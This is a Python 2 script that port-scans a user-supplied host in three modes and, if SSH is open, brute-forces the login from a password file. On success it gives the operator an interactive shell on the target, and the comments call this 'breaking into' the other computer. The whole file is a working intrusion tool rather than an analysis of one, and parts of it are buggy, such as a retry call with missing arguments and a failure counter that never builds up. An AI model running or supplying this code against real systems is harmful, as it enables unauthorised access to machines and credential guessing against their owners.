import socket
import subprocess
import sys
import random
from random import randint
import time
from datetime import datetime
from pexpect import pxssh
import argparse

subprocess.call('clear', shell=True)

def scan1(remoteServerIP):
    sshOpen=False
    sec = input("Choose how long time to sleep\n")
    print "-" * 60
    print "Please wait, scanning remote host", remoteServerIP
    print "-" * 60
    file = open('Open_Ports.txt', 'w+')
    file.write('Those ports are open:\n')
    socket.setdefaulttimeout(0.05)

    try:

        counter = 0
        
        for port in range(65535):
            if counter%10==0:
                 print "waiting {} seconds".format(sec)
                 time.sleep(sec)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                if port==22:
                    sshOpen = True
                print "Port {}: 	 Open".format(port)
                file.write("port {}\n".format(port))
            counter=counter+1
            sock.close()
            file.closed

    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        sys.exit()

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

    except socket.error:
        print "Couldn't connect to server"
        sys.exit()

    return sshOpen

def scan2 (remoteServerIP):
    sshOpen = False
    sshSearched = False
    print "-" * 60
    print "Please wait, scanning remote host", remoteServerIP
    print "-" * 60
    file = open('Open_Ports.txt', 'w+')
    file.write('Those ports are open:\n')
    socket.setdefaulttimeout(1)
    counter = 0
    try:
       list = range(65535)
       random.shuffle(list)
       for port in list:
            if port == 22:
                sshSearched = True
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            print "Try {}".format(port)
            if result == 0:
                if port == 22:
                    sshOpen = True
                print "Port {}: 	 Open".format(port)
                file.write("port {}\n".format(port))
            counter = counter + 1
            sock.close()
            file.closed

    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        sys.exit()

    except socket.gaierror:
         print 'Hostname could not be resolved. Exiting'
         sys.exit()

    except socket.error:
        print "Couldn't connect to server"
        sys.exit()

    return sshOpen


def scan3 (remoteServerIP):
    sshOpen=False
    print "-" * 60
    print "Please wait, scanning remote host", remoteServerIP
    print "-" * 60
    list_of_ports=[21,22,23,25,53,80,443,110,135,137,138,139,1433,1434]

    file = open('Open_Ports.txt', 'w+')
    file.write('Those ports are open:\n')
    socket.setdefaulttimeout(1)
    try:
        for i in range(len(list_of_ports)):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, list_of_ports[i]))
            if result == 0:
                if list_of_ports[i]==22:
                    sshOpen = True
                print "Port {}: 	 Open".format(list_of_ports[i])
                file.write("port {}\n".format(list_of_ports[i]))
            else:
                print "port {}:      close".format(list_of_ports[i])
            sock.close()
            file.closed

    except KeyboardInterrupt:
        print "You pressed Ctrl+C"
        sys.exit()

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

    except socket.error:
        print "Couldn't connect to server"
        sys.exit()
    return sshOpen


def connect(host, user, password, port):   #take host user and password
    global Found
    Fails = 0

    try:
        s = pxssh.pxssh()                       #s is ssh session
        s.login(host, user, password, port)           #try to login
        print 'Password Found: ' + password
        return s

    except Exception, e:
        if Fails > 10000:                       #Check 10,000 lines in the file
            print "I chaecked 10,000 passwords"
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails += 1
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            #time.sleep(1)
            return connect(host, user, password)
        return None



def main():
    sshOpen = False
    remoteServer    = raw_input("Enter a ip host to scan:\n ")
    version      = input("Choose:\nNaive scan (1)\nRandom scan (2)\nSmart scan (3)\n")
    remoteServerIP  = socket.gethostbyname(remoteServer)
    if version==1:
        sshOpen = scan1(remoteServerIP)
    elif version==2:
        sshOpen = scan2(remoteServerIP)
    elif version==3:
        sshOpen = scan3(remoteServerIP)
    if not sshOpen:
        print "ssh port is closed so we cant break into the other computer"
        return 0
    print "starting breaking"
    username   = raw_input("\nwhat is the username?\n")
    passfile   = raw_input("\nwhat is the passwords file?\n")
    

    
    with open(passfile, 'r') as infile:     #open the file
        for line in infile:
            password = line.strip('\r\n')
            print "Testing: " + str(password)
            con = connect(remoteServer, username, password, 22)    
   #trying to connect with the ip,username and password
            if con:
                print "[SSH connected, Issue commands (q or Q) To quit]"
                command = raw_input(">")
                while command != 'q' and command != 'Q':
                    con.sendline(command)
                    con.prompt()
                    print con.before
                    command = raw_input(">")
  















if __name__ == '__main__':
    main() 
